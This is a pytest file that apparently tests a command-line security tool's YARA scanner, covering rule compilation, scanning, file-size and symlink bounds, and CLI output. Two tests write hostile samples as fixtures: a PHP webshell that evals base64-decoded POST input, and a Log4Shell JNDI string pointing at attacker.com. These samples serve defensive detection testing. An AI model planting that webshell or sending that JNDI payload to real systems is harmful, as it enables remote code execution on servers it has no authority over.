import pytest
import yara
from typer.testing import CliRunner

from eva.cli.app import app
from eva.security_tools.yara_scanner import (
    compile_yara_rules,
    get_default_rules_path,
    scan_with_yara,
)

runner = CliRunner()


def test_default_rules_exist_and_compile():
    rules_dir = get_default_rules_path()
    assert rules_dir.exists() and rules_dir.is_dir()
    compiled = compile_yara_rules(rules_dir)
    assert isinstance(compiled, yara.Rules)


def test_compile_single_file_and_output(tmp_path):
    rule_file = tmp_path / "test.yar"
    rule_file.write_text(
        """
rule TestSimple {
    meta:
        description = "Test rule"
        severity = "high"
    strings:
        $s = "MALICIOUS_PAYLOAD"
    condition:
        $s
}
""",
        encoding="utf-8",
    )
    compiled_out = tmp_path / "test.yarc"
    compiled = compile_yara_rules(rule_file, output_path=compiled_out)
    assert isinstance(compiled, yara.Rules)
    assert compiled_out.exists()

    # Load compiled rules directly
    loaded = compile_yara_rules(compiled_out)
    assert isinstance(loaded, yara.Rules)


def test_compile_invalid_rules_raises(tmp_path):
    rule_file = tmp_path / "invalid.yar"
    rule_file.write_text("rule InvalidSyntax { condition: true and }", encoding="utf-8")
    with pytest.raises(yara.SyntaxError):
        compile_yara_rules(rule_file)


def test_scan_with_yara_matching(tmp_path):
    # Create sample file containing webshell signature
    webshell_file = tmp_path / "shell.php"
    webshell_file.write_text("<?php eval(base64_decode($_POST['cmd'])); ?>", encoding="utf-8")

    clean_file = tmp_path / "clean.txt"
    clean_file.write_text("Hello, World! Just an innocent documentation file.", encoding="utf-8")

    rules_dir = get_default_rules_path()
    findings = scan_with_yara(tmp_path, rules=rules_dir, recursive=True)

    matched_rules = {f.rule_id for f in findings}
    assert "PhpWebshellGeneric" in matched_rules

    # Verify Finding attributes
    php_finding = next(f for f in findings if f.rule_id == "PhpWebshellGeneric")
    assert php_finding.severity == "high"
    assert php_finding.category == "webshell"
    assert "shell.php" in (php_finding.file or "")
    assert "$p1 @" in php_finding.evidence
    assert php_finding.remediation != ""
    assert php_finding.fingerprint != ""


def test_scan_with_yara_nonexistent_target():
    with pytest.raises(FileNotFoundError):
        scan_with_yara("/path/to/nonexistent/file_xyz")


def test_cli_yara_scan_dry_run(tmp_path):
    test_target = tmp_path / "test_dir"
    test_target.mkdir()
    result = runner.invoke(app, ["sec", "yara", "scan", str(test_target), "--dry-run"])
    assert result.exit_code == 0
    assert "[Dry-Run]" in result.output
    assert "Planned YARA scan" in result.output


def test_cli_yara_scan_live(tmp_path):
    test_file = tmp_path / "exploit.log"
    test_file.write_text("Attempted ${jndi:ldap://attacker.com/a} exploit", encoding="utf-8")

    result = runner.invoke(app, ["sec", "yara", "scan", str(test_file), "--format", "json,markdown"])
    assert result.exit_code == 0
    assert "YARA scan complete" in result.output
    assert "Log4jJndiExploit" in result.output or "finding" in result.output.lower()


def test_cli_yara_compile_dry_run(tmp_path):
    rules_dir = get_default_rules_path()
    out = tmp_path / "rules.yarc"
    result = runner.invoke(app, ["sec", "yara", "compile", str(rules_dir), "-o", str(out), "--dry-run"])
    assert result.exit_code == 0
    assert "[Dry-Run]" in result.output


def test_cli_yara_compile_live(tmp_path):
    rules_dir = get_default_rules_path()
    out = tmp_path / "compiled_rules.yarc"
    result = runner.invoke(app, ["sec", "yara", "compile", str(rules_dir), "-o", str(out)])
    assert result.exit_code == 0
    assert out.exists()
    assert "Successfully compiled YARA rules" in result.output


def test_yara_scanner_bounds_and_stats(tmp_path):
    from eva.security_tools.yara_scanner import YaraScanner, collect_scan_files

    # 1. Normal file
    f_normal = tmp_path / "normal.txt"
    f_normal.write_text("MALICIOUS_PAYLOAD", encoding="utf-8")

    # 2. Oversized file
    f_large = tmp_path / "large.bin"
    f_large.write_bytes(b"A" * 1000)

    # 3. Ignored directory
    git_dir = tmp_path / ".git"
    git_dir.mkdir()
    (git_dir / "secret.txt").write_text("MALICIOUS_PAYLOAD", encoding="utf-8")

    # 4. Symlink
    symlink_target = tmp_path / "symlink_file.txt"
    try:
        symlink_target.symlink_to(f_normal)
    except OSError:
        pass

    # Collect with max_size_bytes = 500
    files, skipped = collect_scan_files(
        tmp_path,
        max_file_size_bytes=500,
        recursive=True,
    )
    assert f_normal in files
    assert f_large not in files
    assert (git_dir / "secret.txt") not in files
    assert "oversized" in skipped
    assert "symlink" in skipped

    # Run YaraScanner directly
    rule_file = tmp_path / "simple.yar"
    rule_file.write_text(
        """
rule MatchPayload {
    strings:
        $s = "MALICIOUS_PAYLOAD"
    condition:
        $s
}
""",
        encoding="utf-8",
    )
    scanner = YaraScanner(rules=rule_file, max_file_size_bytes=500)
    result = scanner.scan(tmp_path)
    assert len(result) >= 1
    assert result.files_scanned >= 1
    assert result.files_skipped >= 1
    assert result.duration_seconds >= 0
    assert result.timed_out is False


def test_cli_yara_scan_bounds_flags(tmp_path):
    test_file = tmp_path / "test.txt"
    test_file.write_text("hello", encoding="utf-8")

    result = runner.invoke(app, ["sec", "yara", "scan", str(test_file), "--max-size", "1048576", "--timeout", "10"])
    assert result.exit_code == 0
    assert "YARA scan complete" in result.output
